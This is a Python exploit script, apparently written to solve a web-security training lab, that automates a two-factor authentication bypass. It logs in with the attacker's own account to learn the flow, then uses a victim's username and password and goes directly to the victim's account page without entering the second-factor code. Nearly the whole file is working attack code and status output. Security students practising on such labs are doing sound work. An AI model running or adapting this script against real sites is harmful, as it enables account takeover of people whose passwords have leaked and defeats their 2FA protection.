#!/usr/bin/env python3
# 2FA simple bypass
# ------------------
# Not simple at all!
# To be fair, it is super simple if you do it manually
# But to create this, from `login` then `logout` then `login` again
# Pain in my ass! but I love it
import requests
import sys
import re
from bs4 import BeautifulSoup
from operator import itemgetter

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

MYUSER = "wiener"
MYPASS = "peter"

def get_email(url):
    try:
        req = requests.get(url, verify=False, proxies=p)
        soup = BeautifulSoup(req.text, "html.parser")
        email = soup.find('a', id='exploit-link')
        get_link = str(email).split()[2]
        cleaning = get_link.replace('href=','')
        result = cleaning.replace('"','')
        return result
    except IndexError:
        print("[+] You already solve the lab...     [congratz]")
        sys.exit(1)

def login_cookies(url, user, password):
    data = {'username':user, 'password':password}
    req = requests.post(url, data=data, verify=False, proxies=p, allow_redirects=False)
    cookies = str(req.cookies).split()[1]
    return cookies.replace('session=',"")

def get_code(url):
    req = requests.get(url, verify=False, proxies=p)
    re_code = re.search("([A-Za-z]+( [A-Za-z]+)+) [0-9]+", req.text)
    code = str(re_code).split()[8]
    return(code.replace("'>",""))

def login_with_code_get_cookies(url, code, cookies):
    data = {'mfa-code':code}
    c = {'session':cookies}
    req = requests.post(url, data=data, cookies=c, verify=False, proxies=p, allow_redirects=False)
    if "Internal Server Error" not in req.text:
        cookies_login2 = str(req.cookies).split()[1]
        location = req.headers['Location']
        return location, cookies_login2.replace('session=',"")
    else:
        return "[+] Status Code...   [{}]".format(req.status_code)
    
def get_param(url, location, cookies):
    newurl = url.replace('/login', location)
    c = {'session':cookies}
    req = requests.get(newurl, cookies=c, verify=False, proxies=p)
    soup = BeautifulSoup(req.text, "html.parser")
    scrape_header = soup.find('section', {"class": "top-links"})
    get_param = str(scrape_header).split()[5]
    cleaning = get_param.replace('href="',"")
    result = cleaning.replace('">My', "")
    return result

def just_logout(url, cookies):
    c = {'session':cookies}
    requests.get(url, cookies=c, verify=False, proxies=p, allow_redirects=False)

def get_page(url, param, cookies):
    c = {'session':cookies}
    req = requests.get(url.replace('/login',param), cookies=c, verify=False, proxies=p)
    soup = BeautifulSoup(req.text, "html.parser")

    # Your username is: <user>
    paragraph = soup.find(id='account-content')
    my_list = str(paragraph).split()
    index = [2,3,4,5]
    my_string = ' '.join(list(itemgetter(*index)(my_list)))
    cleaning = my_string.replace('<p>',"")
    result = cleaning.replace('</p>',"")
    return result

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        user = sys.argv[2].strip()
        password = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <user> <passwords>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com/login admin password".format(sys.argv[0]))
        sys.exit(1)

    # get email link from `index` page
    email = get_email(url)
    print("[-] Get the email link...        [{}]".format(email))

    # login and get the cookies `/login`
    cookies_login = login_cookies(url, MYUSER, MYPASS)
    print("[-] Our valid user cookies...    [{}]".format(cookies_login))

    # get verification code from email
    code = get_code(email)
    print("[-] Retrieve the code...         [{}]".format(code))
 
    # login with the code at `/login2`
    # get the new cookies, and the location
    location, cookies_login2 = login_with_code_get_cookies(url.replace('/login','/login2'), code, cookies_login)
    print("[-] Get new cookies...           [{}]".format(cookies_login2))
    print("[-] Successfully login at...     [{}]".format(location))

    # get the `id` params
    params = get_param(url, location, cookies_login2)
    print("[-] Found the parameter...       [{}]".format(params))

    # logout from the session `wiener`
    logout = just_logout(url.replace('/login','/logout'), cookies_login2)
    print("[-] Logout from user...          [{}]".format(MYUSER))

    # login and get the `victim` cookies `/login`
    victim_cookies = login_cookies(url, user, password)
    print("[-] Login as victim...           [{}]".format(user))
    print("[-] Get the victim cookies...    [{}]".format(victim_cookies))

    # get page as the `victim`
    result  = get_page(url, params.replace(MYUSER, user), victim_cookies)
    print("[-] Successfully login as...     [{}]".format(result))